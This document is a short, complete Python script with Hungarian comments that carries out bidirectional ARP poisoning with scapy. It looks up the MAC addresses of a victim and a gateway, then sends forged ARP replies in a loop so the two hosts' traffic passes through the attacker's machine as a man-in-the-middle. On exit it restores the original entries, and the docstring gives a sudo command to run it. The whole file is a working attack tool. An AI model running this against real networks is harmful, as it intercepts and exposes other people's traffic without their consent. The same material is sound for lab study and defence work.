#!/usr/bin/env python3
"""Kétirányú ARP poisoning: az áldozat és a gateway felé is azt hazudjuk,
hogy a másik MAC-címe a miénk. Így a kétirányú forgalom rajtunk át megy (MITM).

Futtatás: sudo python3 arp_spoof.py eth0 10.10.10.20 10.10.10.1
"""
import sys, time
from scapy.all import ARP, send, get_if_hwaddr, arping, conf

def get_mac(ip, iface):
    ans, _ = arping(ip, iface=iface, verbose=0)
    return ans[0][1].src

def main():
    iface, victim, gateway = sys.argv[1], sys.argv[2], sys.argv[3]
    conf.iface = iface
    vmac, gmac = get_mac(victim, iface), get_mac(gateway, iface)
    print(f"[*] áldozat {victim} @ {vmac} | gw {gateway} @ {gmac}")
    try:
        while True:
            send(ARP(op=2, pdst=victim, psrc=gateway, hwdst=vmac), verbose=0)
            send(ARP(op=2, pdst=gateway, psrc=victim, hwdst=gmac), verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Takarítás: eredeti ARP-k visszaállítása...")
        send(ARP(op=2, pdst=victim, psrc=gateway, hwdst=vmac, hwsrc=gmac), count=3, verbose=0)
        send(ARP(op=2, pdst=gateway, psrc=victim, hwdst=gmac, hwsrc=vmac), count=3, verbose=0)

if __name__ == "__main__":
    main()
